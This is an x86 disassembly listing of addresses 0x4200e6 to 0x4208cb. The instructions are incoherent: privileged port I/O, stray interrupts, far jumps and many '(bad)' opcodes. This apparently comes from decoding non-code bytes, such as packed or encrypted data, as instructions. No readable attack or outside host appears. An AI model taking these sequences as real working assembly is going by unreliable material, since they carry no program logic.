  4200e6:	aas    
  4200e7:	sbb    eax,0x4e05cc45
  4200ec:	nop
  4200ed:	mov    eax,ds:0x3a0fbf74
  4200f2:	pushf  
  4200f3:	into   
  4200f4:	ins    BYTE PTR es:[edi],dx
  4200f5:	fsub   DWORD PTR [edi]
  4200f7:	push   cs
  4200f8:	adc    DWORD PTR [eax-0x79],0x36ffd0aa
  4200ff:	cmp    DWORD PTR [ebx],edx
  420101:	push   edx
  420102:	cmp    eax,0x4a068e0e
  420107:	xor    al,0x8
  420109:	pop    edi
  42010a:	xchg   ebp,eax
  42010b:	mov    al,ds:0xc5c8c2e9
  420110:	std    
  420111:	int    0xbc
  420113:	in     eax,0x11
  420115:	test   DWORD PTR [ecx+0x1f48deaf],ebp
  42011b:	and    bl,dl
  42011d:	in     al,0xaf
  42011f:	adc    dh,BYTE PTR [edx+0x69]
  420122:	cmp    al,bh
  420124:	push   cs
  420125:	frstor [ecx]
  420127:	xor    bh,ch
  420129:	int3   
  42012a:	aad    0xca
  42012c:	retf   0x6c
  42012f:	popa   
  420130:	jo     0x420198
  420132:	mov    ds:0x18a62f5,al
  420137:	sti    
  420138:	sar    ch,cl
  42013a:	cmp    esi,ecx
  42013c:	sti    
  42013d:	jae    0x4200ea
  42013f:	mov    edi,DWORD PTR [ecx]
  420141:	push   ds
  420142:	xchg   BYTE PTR [edx-0x3d725c5d],dl
  420148:	xor    esp,DWORD PTR [eax+edi*4+0x43]
  42014c:	xor    cl,BYTE PTR [ecx-0x22]
  42014f:	ret    0xb3e6
  420152:	int    0x4e
  420154:	jecxz  0x4201b6
  420156:	lods   al,BYTE PTR ds:[esi]
  420157:	ds add ah,0xe3
  42015b:	jno    0x420117
  42015d:	push   ebx
  42015e:	dec    eax
  42015f:	outs   dx,DWORD PTR ds:[esi]
  420160:	mov    al,ds:0xacc741d7
  420165:	mov    ds:0xad1f7fa2,al
  42016a:	mov    ?,WORD PTR [edx+0x54343eb7]
  420170:	push   esi
  420171:	loope  0x4201db
  420173:	addr16 in al,dx
  420175:	outs   dx,DWORD PTR ds:[esi]
  420176:	(bad)  [di-0x20]
  42017a:	xor    eax,0x46a5be91
  42017f:	xchg   ch,cl
  420181:	fsincos 
  420183:	sbb    eax,0x262b9c51
  420188:	test   DWORD PTR [ebp+0x49],edx
  42018b:	jne    0x4201af
  42018d:	addr16 add al,0xbf
  420190:	jo     0x42019f
  420192:	sub    ch,bh
  420194:	and    cl,BYTE PTR ds:0x93730c39
  42019a:	dec    eax
  42019b:	xor    al,0x5b
  42019d:	je     0x420153
  42019f:	stos   BYTE PTR es:[edi],al
  4201a0:	dec    edx
  4201a1:	add    ch,BYTE PTR [edi-0x16185bcb]
  4201a7:	enter  0xe01f,0xa2
  4201ab:	jb     0x420139
  4201ad:	xor    eax,0xbf2f782b
  4201b2:	xchg   esp,eax
  4201b3:	add    BYTE PTR [ecx],ah
  4201b5:	pushf  
  4201b6:	and    BYTE PTR [eax],bh
  4201b8:	push   ebx
  4201b9:	test   esp,esp
  4201bb:	out    0xb,al
  4201bd:	mov    al,ds:0xb01dca41
  4201c2:	pop    eax
  4201c3:	shl    BYTE PTR [edi+eiz*1],cl
  4201c6:	xchg   esi,eax
  4201c7:	mov    edx,0x864c9e0f
  4201cc:	cmp    bl,BYTE PTR [edi]
  4201ce:	cmp    eax,0xcca0d14d
  4201d3:	mov    edx,DWORD PTR [ebp-0x7b]
  4201d6:	ds popf 
  4201d8:	or     DWORD PTR [ebp+ebp*1+0x4a33777],edx
  4201df:	and    ecx,DWORD PTR [edx+0x2]
  4201e2:	aas    
  4201e3:	retf   0xb6cd
  4201e6:	ss inc edi
  4201e8:	fcomp  QWORD PTR [edi+0x192347a5]
  4201ee:	scas   eax,DWORD PTR es:[edi]
  4201ef:	cs call 0x3dac7e54
  4201f5:	mov    ds,esi
  4201f7:	add    eax,DWORD PTR [edi+0xd]
  4201fa:	cmp    BYTE PTR [ebp-0x5037351e],dl
  420200:	mov    dh,0xaa
  420202:	mov    edi,0xa6178072
  420207:	mov    ds:0x90d217dd,al
  42020c:	xchg   ebp,eax
  42020d:	scas   al,BYTE PTR es:[edi]
  42020e:	mov    edi,0x600dc41b
  420213:	or     eax,DWORD PTR [esi+eiz*4+0x4c39fc65]
  42021a:	int3   
  42021b:	pop    es
  42021c:	stos   BYTE PTR es:[edi],al
  42021d:	test   BYTE PTR [ebx-0x14],0xc8
  420221:	mov    eax,ds:0xe585b6a9
  420226:	bound  ebp,QWORD PTR ds:[eax-0x33]
  42022a:	mov    ds:0x433924f8,eax
  42022f:	aaa    
  420230:	mov    BYTE PTR [esi+0x2c],0xc5
  420234:	sub    al,0x6c
  420236:	pop    eax
  420237:	xor    eax,0x3367349c
  42023c:	sbb    eax,DWORD PTR [ebx]
  42023e:	xchg   edx,eax
  42023f:	jg     0x42026d
  420241:	inc    esp
  420242:	xchg   ecx,eax
  420243:	mov    BYTE PTR [ebx+0x7d],bh
  420246:	(bad)  
  420247:	pop    ebp
  420248:	sub    edx,ebp
  42024a:	sbb    BYTE PTR [ecx],al
  42024c:	popa   
  42024d:	das    
  42024e:	aam    0x61
  420250:	jle    0x42024d
  420252:	inc    BYTE PTR [edx+0x7916ad52]
  420258:	push   edx
  420259:	not    DWORD PTR [ebx]
  42025b:	into   
  42025c:	inc    ebp
  42025d:	cli    
  42025e:	cmp    ebp,DWORD PTR [esi]
  420260:	or     ch,BYTE PTR [esi-0x62]
  420263:	xchg   esi,eax
  420264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420265:	fs pop ecx
  420267:	mov    eax,ds:0xba754949
  42026c:	imul   ecx,DWORD PTR ds:0xfcfce5dd,0x3768bb36
  420276:	push   cs
  420277:	dec    ecx
  420278:	jnp    0x4202ca
  42027a:	pop    ebp
  42027b:	sti    
  42027c:	adc    ah,bl
  42027e:	pop    edi
  42027f:	mul    DWORD PTR [edx+0x414553f8]
  420285:	inc    esi
  420286:	sub    ch,BYTE PTR [edi-0x3edf4549]
  42028c:	mov    ch,0x73
  42028e:	shr    edi,1
  420290:	test   BYTE PTR [esi+ecx*8+0x7c],dl
  420294:	cmp    ebp,edi
  420296:	sbb    al,0xea
  420298:	xchg   ebx,eax
  420299:	dec    ebp
  42029a:	loopne 0x420249
  42029c:	shr    DWORD PTR [ebp-0x70251b4e],cl
  4202a2:	jae    0x42029e
  4202a4:	push   0x4c
  4202a6:	repz lock cmp DWORD PTR [edx],esp
  4202aa:	aam    0x9d
  4202ac:	dec    edx
  4202ad:	test   BYTE PTR [edx+eax*1+0x1c],cl
  4202b1:	push   esi
  4202b2:	jle    0x4202b7
  4202b4:	add    eax,0x5c35b42c
  4202b9:	cwde   
  4202ba:	push   ecx
  4202bb:	fcmovu st,st(3)
  4202bd:	fmul   QWORD PTR [esi-0x38]
  4202c0:	es ss mov dl,0x80
  4202c4:	lods   eax,DWORD PTR ds:[esi]
  4202c5:	inc    eax
  4202c6:	loop   0x4202ad
  4202c8:	mov    bh,0x31
  4202ca:	arpl   WORD PTR [esi-0x19],cx
  4202cd:	or     eax,0x1a000620
  4202d2:	aaa    
  4202d3:	mov    esi,0x23fcbf1a
  4202d8:	xchg   ebx,eax
  4202d9:	mov    ch,BYTE PTR [ebx+ecx*1-0x713e9961]
  4202e0:	push   ebx
  4202e1:	pop    ds
  4202e2:	mov    dh,dl
  4202e4:	or     al,0xc9
  4202e6:	cmpxchg DWORD PTR [edx+0x76],ebp
  4202ea:	pop    esi
  4202eb:	enter  0xe9ca,0x13
  4202ef:	pop    ebp
  4202f0:	xchg   edx,eax
  4202f1:	sti    
  4202f2:	and    esp,ebx
  4202f4:	cmp    al,0x25
  4202f6:	jl     0x420302
  4202f8:	xchg   ebx,eax
  4202f9:	inc    ebp
  4202fa:	pop    edi
  4202fb:	jmp    0x420340
  4202fd:	jle    0x42032d
  4202ff:	addr16 inc esp
  420301:	or     BYTE PTR [edx+0x349afa09],0xd0
  420308:	lock adc DWORD PTR [edi],ebx
  42030b:	pop    ebx
  42030c:	neg    bh
  42030e:	adc    DWORD PTR [ecx+0x26],0x17
  420312:	(bad)  
  420313:	pop    ebx
  420314:	xchg   ebp,eax
  420315:	sbb    edi,ebp
  420317:	cmp    edi,ebx
  420319:	gs loop 0x42037b
  42031c:	xor    eax,0xee6961a6
  420321:	sub    DWORD PTR ss:[esi+0x16],eax
  420325:	ss stc 
  420327:	or     eax,0x9f7e6c63
  42032c:	test   BYTE PTR [edi+0x7e1e41a9],bl
  420332:	outs   dx,BYTE PTR ds:[esi]
  420333:	pop    esp
  420334:	inc    ebx
  420335:	xchg   edi,eax
  420336:	xchg   esi,eax
  420337:	(bad)  
  420339:	icebp  
  42033a:	xchg   bl,dh
  42033c:	sbb    dh,BYTE PTR ss:[esi-0x5f4930ed]
  420343:	shl    dl,0xec
  420346:	lds    esp,FWORD PTR [eax]
  420348:	dec    esi
  420349:	scas   al,BYTE PTR es:[edi]
  42034a:	cmp    dl,BYTE PTR [edx-0x7e]
  42034d:	xchg   BYTE PTR [edi+0x631b0121],dh
  420353:	rcl    cl,0x33
  420356:	jo     0x420309
  420358:	leave  
  420359:	test   al,0x24
  42035b:	inc    edi
  42035c:	not    ecx
  42035e:	fmul   st(4),st
  420360:	out    dx,eax
  420361:	shl    DWORD PTR [eax-0x67992899],cl
  420367:	jl     0x4203b9
  420369:	xchg   edi,eax
  42036a:	and    DWORD PTR [edx],0xffffff9a
  42036d:	push   0x2859a9d0
  420372:	mov    ds:0xb4201f9e,eax
  420377:	xor    dh,BYTE PTR [ebp+edx*2-0x22]
  42037b:	mov    dh,BYTE PTR [edx+0x2f61485a]
  420381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420382:	rcl    BYTE PTR [eax+eax*8+0x60],cl
  420386:	cmc    
  420387:	jle    0x4203e1
  420389:	retf   
  42038a:	je     0x42037d
  42038c:	jmp    0xeac2:0xef491734
  420393:	add    dl,bl
  420395:	mov    WORD PTR [ebx],cs
  420397:	shl    BYTE PTR [ecx-0x76],1
  42039a:	jne    0x420418
  42039c:	push   ss
  42039d:	jae    0x42039d
  42039f:	push   ebx
  4203a0:	jbe    0x420363
  4203a2:	dec    edi
  4203a3:	mov    ds:0xf90ee0fd,eax
  4203a8:	push   es
  4203a9:	rcl    BYTE PTR [esi],1
  4203ab:	xlat   BYTE PTR ds:[ebx]
  4203ac:	dec    edi
  4203ad:	in     eax,dx
  4203ae:	mov    dh,0xd2
  4203b0:	pushf  
  4203b1:	add    BYTE PTR [ecx-0x6c7dedb0],0xa1
  4203b8:	mov    ebx,0xb040ab48
  4203bd:	loope  0x420406
  4203bf:	dec    edi
  4203c0:	call   0x63d77721
  4203c5:	test   eax,0x765c041d
  4203ca:	mov    edx,0x57eb4152
  4203cf:	jb     0x42041f
  4203d1:	outs   dx,BYTE PTR ds:[esi]
  4203d2:	jns    0x4203ee
  4203d4:	lock lods al,BYTE PTR ds:[esi]
  4203d6:	scas   al,BYTE PTR es:[edi]
  4203d7:	js     0x42037d
  4203d9:	xchg   ebx,eax
  4203da:	(bad)  
  4203db:	fisub  WORD PTR [eax+0x90f8730]
  4203e1:	in     al,dx
  4203e2:	pop    ss
  4203e3:	test   DWORD PTR [edx+ebx*1],eax
  4203e6:	jge    0x420370
  4203e8:	jbe    0x42039b
  4203ea:	push   ss
  4203eb:	sar    edi,cl
  4203ed:	jmp    0x3830:0x5adf587b
  4203f4:	fst    QWORD PTR [eax+0x58972d10]
  4203fa:	out    dx,al
  4203fb:	mov    eax,0xba730186
  420400:	and    DWORD PTR [edx+0x9],edi
  420403:	hlt    
  420404:	retf   0x71e1
  420407:	dec    esp
  420408:	shl    edx,cl
  42040a:	mov    ah,0x35
  42040c:	out    dx,al
  42040d:	jae    0x420488
  42040f:	outs   dx,BYTE PTR ds:[esi]
  420410:	pop    esi
  420411:	rcl    edi,1
  420413:	int    0xb6
  420415:	push   es
  420416:	or     ebp,DWORD PTR [edi+0x6e975233]
  42041c:	dec    ebp
  42041d:	mov    ds:0xc2a8b814,eax
  420422:	mov    dl,0x68
  420424:	sbb    esi,DWORD PTR [ebp-0x7e]
  420427:	stos   DWORD PTR es:[edi],eax
  420428:	imul   ebx,ecx,0xd160f9b1
  42042e:	pusha  
  42042f:	mov    cl,0xa9
  420431:	pop    ecx
  420432:	cdq    
  420433:	cmp    DWORD PTR [esi-0x36],ebx
  420436:	int    0xfc
  420438:	icebp  
  420439:	sahf   
  42043a:	pop    esi
  42043b:	std    
  42043c:	xchg   ebx,eax
  42043d:	fs and al,0xd3
  420440:	in     al,0x7
  420442:	test   eax,0xd594b4fa
  420447:	das    
  420448:	ja     0x4203f2
  42044a:	cli    
  42044b:	les    ecx,FWORD PTR [eax+0x44]
  42044e:	and    BYTE PTR [ebx],dl
  420450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420451:	in     al,0xcd
  420453:	dec    edi
  420454:	lods   eax,DWORD PTR ds:[esi]
  420455:	jle    0x420483
  420457:	jnp    0x42043d
  420459:	pop    ss
  42045a:	test   BYTE PTR [edx],ch
  42045c:	pop    ds
  42045d:	adc    BYTE PTR [eax],al
  42045f:	test   BYTE PTR [eax+0x5e],al
  420462:	dec    esi
  420463:	pop    es
  420464:	cmp    eax,0x86d48163
  420469:	enter  0xcba6,0xab
  42046d:	das    
  42046e:	hlt    
  42046f:	inc    esp
  420470:	stos   DWORD PTR es:[edi],eax
  420471:	repnz icebp 
  420473:	ficomp WORD PTR [edx]
  420475:	fdivr  DWORD PTR ds:0x69843316
  42047b:	and    BYTE PTR [ebp-0x403ed3b],dh
  420481:	out    0xf,al
  420483:	daa    
  420484:	call   0xfb50:0xb5a0d25c
  42048b:	dec    ecx
  42048c:	ins    DWORD PTR es:[edi],dx
  42048d:	mov    edi,0xb9c422ed
  420492:	packssdw mm6,QWORD PTR [eax]
  420495:	mov    ds:0x7362982,al
  42049a:	and    BYTE PTR [ebp+0x31],ch
  42049d:	rol    BYTE PTR [esi+0x49],cl
  4204a0:	cwde   
  4204a1:	jle    0x42047a
  4204a3:	jmp    0x4ee2:0xa23c9f4d
  4204aa:	fadd   QWORD PTR [edx+0x56fa9761]
  4204b0:	imul   esi,DWORD PTR [edi+0x188ea2ed],0x7e764d6f
  4204ba:	fidivr WORD PTR [ecx+eiz*8+0x4a5f435a]
  4204c1:	mov    ecx,0xc1d5c1d
  4204c6:	ss lahf 
  4204c8:	test   eax,0xe584b9cc
  4204cd:	mov    ?,WORD PTR [ecx]
  4204cf:	push   edi
  4204d0:	into   
  4204d1:	es cli 
  4204d3:	ss out dx,eax
  4204d5:	push   ss
  4204d6:	sub    BYTE PTR [edx+0x393b1205],dh
  4204dc:	and    al,0xff
  4204de:	sbb    edx,ebp
  4204e0:	xor    BYTE PTR [ecx+0x78bbf41d],0x34
  4204e7:	ss mov ebx,0xb238d51b
  4204ed:	inc    esp
  4204ee:	jbe    0x420525
  4204f0:	daa    
  4204f1:	dec    esi
  4204f2:	scas   eax,DWORD PTR es:[edi]
  4204f3:	pop    ebx
  4204f4:	or     DWORD PTR [edx-0x282ae288],ebp
  4204fa:	cmp    BYTE PTR [edx+edi*8+0x13],0x4
  4204ff:	aam    0x50
  420501:	add    DWORD PTR [eax-0x6ad846c9],ecx
  420507:	pmullw mm4,QWORD PTR [ecx*8+0x3b421edc]
  42050f:	ins    BYTE PTR es:[edi],dx
  420510:	ror    ah,cl
  420512:	sub    eax,0xc41b365
  420517:	or     BYTE PTR [eax+0x32bed0e5],ch
  42051d:	xor    edi,ecx
  42051f:	pusha  
  420520:	inc    ecx
  420521:	rol    BYTE PTR [edx+0x4d],1
  420524:	sub    al,0x0
  420526:	inc    esi
  420527:	jecxz  0x4204df
  420529:	ror    dl,0xd9
  42052c:	push   cs
  42052d:	dec    esi
  42052e:	jmp    0xac4d:0xf7cc6c31
  420535:	mov    esi,0x1536741c
  42053a:	cdq    
  42053b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42053c:	jl     0x4204d7
  42053e:	pop    es
  42053f:	dec    ebp
  420540:	or     al,0xeb
  420542:	(bad)  [eax-0x13]
  420545:	add    al,ah
  420547:	int    0x90
  420549:	add    cl,BYTE PTR ds:0x6575c10c
  42054f:	(bad)  
  420550:	mov    DWORD PTR [edi+0x4a],ecx
  420553:	push   esi
  420554:	mov    WORD PTR [esi-0x509373e2],ds
  42055a:	cdq    
  42055b:	loopne 0x4204f5
  42055d:	sar    BYTE PTR [edx-0x3e],1
  420560:	dec    ecx
  420561:	in     eax,0x1f
  420563:	ror    DWORD PTR [ecx-0x74],cl
  420566:	repnz add al,0x4a
  420569:	sti    
  42056a:	out    dx,al
  42056b:	and    al,0x3e
  42056d:	push   0xfad88569
  420572:	jg     0x4205c5
  420574:	push   edx
  420575:	adc    DWORD PTR [ecx+ecx*1+0xd],esp
  420579:	add    ax,0xb7b0
  42057d:	jbe    0x420586
  42057f:	add    DWORD PTR ds:0x964dea12,0x852ef424
  420589:	dec    esp
  42058a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42058b:	aam    0xf
  42058d:	lods   eax,DWORD PTR ds:[esi]
  42058f:	mov    ebp,0x316adfb3
  420594:	repz and BYTE PTR [esi],ch
  420597:	push   cs
  420598:	adc    bl,BYTE PTR [ecx-0x30]
  42059b:	nop    DWORD PTR [ecx+eiz*4]
  42059f:	std    
  4205a0:	jbe    0x4205c7
  4205a2:	in     al,0x62
  4205a4:	inc    eax
  4205a5:	lea    ebp,[ecx+ecx*2-0x80]
  4205a9:	xor    BYTE PTR [ebp+0xc],0x40
  4205ad:	dec    edi
  4205ae:	mov    dl,0x84
  4205b0:	(bad)  
  4205b1:	retf   
  4205b2:	xchg   ebx,eax
  4205b3:	je     0x420560
  4205b5:	dec    esp
  4205b6:	or     DWORD PTR [ecx+0x4e],0xcdf477f7
  4205bd:	or     al,BYTE PTR [edx+edx*4+0x4e]
  4205c1:	sti    
  4205c2:	mov    dh,0x18
  4205c4:	push   0x1217ad49
  4205c9:	es inc ebp
  4205cb:	add    al,0xb7
  4205cd:	aam    0x3b
  4205cf:	fwait
  4205d0:	add    ebp,edi
  4205d2:	int    0x44
  4205d4:	mov    cl,0x7c
  4205d6:	push   ebx
  4205d7:	in     eax,dx
  4205d8:	xor    al,0xf2
  4205da:	add    cl,BYTE PTR [eax-0x4a]
  4205dd:	call   0x506d5b54
  4205e2:	xchg   edi,eax
  4205e3:	das    
  4205e4:	xchg   BYTE PTR [eax-0x2aac4999],dl
  4205ea:	mov    bl,0xe8
  4205ec:	rcr    DWORD PTR [ebp+0x52],0xc4
  4205f0:	inc    ebp
  4205f1:	aas    
  4205f2:	sar    BYTE PTR [ecx+0x2b950548],0x5a
  4205f9:	and    bl,BYTE PTR [ebx+0x3aee37e7]
  4205ff:	add    ah,BYTE PTR [ecx+0x32cd0bb1]
  420605:	mov    al,BYTE PTR [ecx-0x46a1d5b]
  42060b:	ror    DWORD PTR [edx],cl
  42060d:	dec    edi
  42060e:	push   edi
  42060f:	int    0xfe
  420611:	std    
  420612:	pop    edx
  420613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420614:	fs inc ecx
  420616:	test   eax,0xc5af436e
  42061b:	xlat   BYTE PTR ds:[ebx]
  42061c:	pop    ds
  42061d:	lea    esp,[ebx+0x5be1c650]
  420623:	sar    bh,cl
  420625:	pop    es
  420626:	popf   
  420627:	jp     0x42068d
  420629:	je     0x420615
  42062b:	ror    BYTE PTR [edx-0x4ce5b6af],1
  420631:	call   0xa2df7941
  420636:	pusha  
  420637:	arpl   WORD PTR [ecx],cx
  420639:	ja     0x4205db
  42063b:	(bad)  
  42063c:	je     0x4205cf
  42063e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42063f:	jmp    0x420625
  420641:	ds dec esi
  420643:	and    al,0xa9
  420645:	fcom   QWORD PTR [ecx-0x13a48a9f]
  42064b:	and    al,0x23
  42064d:	adc    DWORD PTR [esi+0x22],edi
  420650:	hlt    
  420651:	xchg   ecx,ecx
  420653:	sbb    DWORD PTR [edi+edx*1-0x4e988633],esi
  42065a:	cmp    eax,0xffffffc1
  42065d:	inc    eax
  42065e:	sbb    eax,0x9389f56d
  420663:	sbb    eax,0x611112b8
  420668:	or     BYTE PTR [ebx+0x4e02864a],dl
  42066e:	xor    eax,0x81e94880
  420673:	(bad)  
  420675:	fild   DWORD PTR cs:[eax+0x137eedd0]
  42067c:	test   DWORD PTR [ebx],0x14c043de
  420682:	xchg   esi,eax
  420683:	cmp    eax,0xe8ac9063
  420688:	push   0x38b815c8
  42068d:	mov    cl,0x8
  42068f:	and    BYTE PTR [esp+ecx*4-0x56b99823],dh
  420696:	push   eax
  420697:	xor    al,0x46
  420699:	pop    ecx
  42069a:	aad    0xd7
  42069c:	fst    st(5)
  42069e:	jle    0x4206b7
  4206a0:	push   ss
  4206a1:	retf   0xc70e
  4206a4:	(bad)  
  4206a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206a6:	pop    ecx
  4206a7:	pop    ebx
  4206a8:	push   es
  4206a9:	les    eax,FWORD PTR [edi+0x64d45d11]
  4206af:	sbb    dh,BYTE PTR [edi-0x4d]
  4206b2:	cmp    ecx,ecx
  4206b4:	fwait
  4206b5:	push   ebx
  4206b6:	jae    0x420725
  4206b8:	push   ds
  4206b9:	mov    BYTE PTR [eax+0x6b],ah
  4206bc:	pop    ds
  4206bd:	dec    ebp
  4206be:	cld    
  4206bf:	or     al,0x24
  4206c1:	shr    BYTE PTR [ebx-0x5d774f65],1
  4206c7:	xor    al,0xa6
  4206c9:	pop    ecx
  4206ca:	aaa    
  4206cb:	push   eax
  4206cc:	push   ss
  4206cd:	inc    esi
  4206ce:	pop    ds
  4206cf:	rcr    eax,1
  4206d1:	sbb    dl,BYTE PTR [esi-0x7b]
  4206d4:	or     DWORD PTR [ecx],esp
  4206d6:	xchg   ebx,eax
  4206d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206d8:	sub    al,BYTE PTR [ebx+0x34]
  4206db:	pop    edi
  4206dc:	xchg   edx,eax
  4206dd:	(bad)  
  4206de:	icebp  
  4206df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206e0:	mov    ebx,0x8e597502
  4206e5:	xchg   esp,eax
  4206e6:	out    0xb1,eax
  4206e8:	add    BYTE PTR [ecx+esi*4-0x485ecdfb],ch
  4206ef:	hlt    
  4206f0:	popf   
  4206f1:	xchg   esi,eax
  4206f2:	fist   DWORD PTR [esi-0x68a758ea]
  4206f8:	jp     0x420685
  4206fa:	pushf  
  4206fb:	or     BYTE PTR [edx-0x25],bl
  4206fe:	pop    ds
  4206ff:	cmp    esp,DWORD PTR [ecx]
  420701:	pusha  
  420702:	jp     0x420734
  420704:	push   eax
  420705:	cmp    al,0x68
  420707:	jo     0x420701
  420709:	mov    ecx,0xbb04b1d3
  42070e:	enter  0xefc1,0xd2
  420712:	jb     0x420750
  420714:	imul   esp,DWORD PTR [edx+0x35],0x52e56b9e
  42071b:	fcom   DWORD PTR [ecx+0x65542871]
  420721:	in     al,dx
  420722:	push   0xffffffb1
  420724:	ret    0xa330
  420727:	xchg   BYTE PTR [edi+0x6a41cba8],bl
  42072d:	bound  edi,QWORD PTR [edx-0x46]
  420730:	ins    DWORD PTR es:[edi],dx
  420731:	shl    BYTE PTR [eax+0x77a21da7],1
  420737:	mov    WORD PTR [ebx+0x20],?
  42073a:	pop    ds
  42073b:	lahf   
  42073c:	lods   al,BYTE PTR ds:[esi]
  42073d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42073e:	aam    0x51
  420740:	mov    dh,cl
  420742:	push   ds
  420743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420744:	mov    dl,0xc1
  420746:	fptan  
  420748:	jnp    0x420720
  42074a:	push   eax
  42074b:	ret    
  42074c:	inc    esp
  42074d:	lock jo 0x420779
  420750:	fyl2xp1 
  420752:	xor    dl,bh
  420754:	popa   
  420755:	cmp    ebx,DWORD PTR [ebx+esi*4-0x74]
  420759:	das    
  42075a:	call   0x6b59a34a
  42075f:	or     eax,0xc7a87673
  420764:	mov    gs,WORD PTR [esp+ebx*2+0x6]
  420768:	popa   
  420769:	jecxz  0x420798
  42076b:	(bad)  
  42076c:	pop    ebx
  42076d:	das    
  42076e:	call   0x7ff1:0xe8ae4673
  420775:	mov    eax,0x61dbb502
  42077a:	mov    edx,0x16f4f5e8
  42077f:	fnstenv [esi+eax*1+0x66]
  420783:	xchg   BYTE PTR [ecx-0x6e411e1f],dh
  420789:	mov    al,0x26
  42078b:	pusha  
  42078c:	push   ebp
  42078d:	jge    0x4207b0
  42078f:	icebp  
  420790:	pop    ds
  420791:	inc    ecx
  420792:	loop   0x42077e
  420794:	lods   eax,DWORD PTR ds:[esi]
  420795:	xchg   esp,eax
  420796:	jnp    0x420816
  420798:	sti    
  420799:	push   cs
  42079a:	arpl   WORD PTR [ebp-0x7297b601],sp
  4207a0:	cmp    eax,0x6e161965
  4207a5:	aad    0xae
  4207a7:	test   BYTE PTR [edx+0x3cdd883a],cl
  4207ad:	rol    DWORD PTR [ebx-0x13],1
  4207b0:	(bad)  
  4207b1:	mov    al,0x73
  4207b3:	retf   0xc571
  4207b6:	or     al,0xa5
  4207b8:	scas   eax,DWORD PTR es:[edi]
  4207b9:	mov    ebx,0x6a0178cd
  4207be:	xlat   BYTE PTR ds:[ebx]
  4207bf:	push   0x303f5a56
  4207c4:	and    cl,dl
  4207c6:	inc    ebp
  4207c7:	sub    bl,BYTE PTR es:[edi-0x5ec25e93]
  4207ce:	push   edx
  4207cf:	xor    edi,esi
  4207d1:	outs   dx,DWORD PTR ds:[esi]
  4207d2:	mov    DWORD PTR [eax-0x53],ebp
  4207d5:	mov    edx,0xfe3bdf73
  4207da:	xchg   BYTE PTR [esi],dl
  4207dc:	push   0xffffff8d
  4207de:	(bad)  
  4207df:	test   al,0x4b
  4207e1:	fsubr  DWORD PTR [edx]
  4207e3:	xor    edi,DWORD PTR [eax]
  4207e5:	loopne 0x4207f3
  4207e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207e8:	and    eax,0xefe2a3ed
  4207ed:	xchg   esp,eax
  4207ee:	xor    esi,ebx
  4207f0:	jge    0x420793
  4207f2:	test   BYTE PTR [ebp+0x10],dl
  4207f5:	or     al,0xa4
  4207f7:	mov    ebp,0x5915fc7
  4207fc:	lahf   
  4207fd:	push   esp
  4207fe:	sar    DWORD PTR [ecx],1
  420800:	test   BYTE PTR [eax+0x7688467e],ah
  420806:	inc    esp
  420807:	mov    es,edi
  420809:	dec    esp
  42080a:	fistp  DWORD PTR [esp+ebp*4]
  42080d:	sub    cl,cl
  42080f:	jnp    0x42086b
  420811:	mov    WORD PTR [edx+0x36],ss
  420814:	int    0xcc
  420816:	mov    ss,WORD PTR [ebp-0x35f3938a]
  42081c:	fwait
  42081d:	push   edx
  42081e:	loop   0x4207ec
  420820:	mov    ds:0x318b3357,al
  420825:	ja     0x420882
  420827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420828:	jno    0x42084c
  42082a:	xchg   ebx,eax
  42082b:	push   edi
  42082c:	lock outs dx,DWORD PTR ds:[esi]
  42082e:	(bad)  
  42082f:	fcmove st,st(2)
  420831:	mov    edx,0x64202414
  420836:	dec    BYTE PTR [edx]
  420838:	pop    ss
  420839:	cs mov cl,0x5e
  42083c:	in     al,0x74
  42083e:	sub    DWORD PTR [esi+esi*2-0x6c],esp
  420842:	push   eax
  420843:	arpl   WORD PTR ds:[edi],ax
  420846:	lahf   
  420847:	arpl   sp,cx
  420849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42084a:	lea    sp,[ebx-0x4ff8a60f]
  420851:	or     al,0xa5
  420853:	pusha  
  420854:	lahf   
  420855:	jb     0x42085c
  420857:	push   0x154c8797
  42085c:	adc    DWORD PTR es:[ebp-0x2daa6542],edx
  420863:	mov    ch,0xa5
  420865:	push   ebp
  420866:	and    al,0x8b
  420868:	lock sbb ebx,eax
  42086b:	stos   BYTE PTR es:[edi],al
  42086c:	daa    
  42086d:	xchg   esp,eax
  42086e:	mov    ch,0x6c
  420870:	pandn  mm4,mm3
  420873:	ds cli 
  420875:	out    dx,al
  420876:	ret    0x27ad
  420879:	paddsb mm6,mm4
  42087c:	cmp    eax,0x43c4384f
  420881:	pop    eax
  420882:	outs   dx,DWORD PTR ds:[esi]
  420883:	adc    eax,0xc395e243
  420888:	(bad)  [ecx-0x18]
  42088b:	retf   
  42088c:	sub    cl,BYTE PTR [esi-0x4c]
  42088f:	mov    edx,0x9da5cd3a
  420894:	ret    0x9745
  420897:	imul   edi,DWORD PTR [eax],0xffffff97
  42089a:	lahf   
  42089b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42089c:	std    
  42089d:	xchg   edi,eax
  42089e:	push   edi
  42089f:	sbb    BYTE PTR [edi],0x6f
  4208a2:	pop    ebx
  4208a3:	dec    edi
  4208a4:	or     DWORD PTR [esi],ebp
  4208a6:	mov    al,ds:0x8ccfa6e3
  4208ab:	dec    edx
  4208ac:	loop   0x4208ff
  4208ae:	or     al,0x54
  4208b0:	jns    0x4208ed
  4208b2:	out    dx,eax
  4208b3:	push   0xffffff9a
  4208b5:	mov    dh,0x5b
  4208b7:	sub    eax,0xcad6ee70
  4208bc:	or     al,0x9b
  4208be:	daa    
  4208bf:	push   ebp
  4208c0:	icebp  
  4208c1:	out    0x7e,al
  4208c3:	xor    DWORD PTR [edi-0x2f],0x607af0e2
  4208ca:	dec    edi
  4208cb:	mov    edi,0xd3f21543
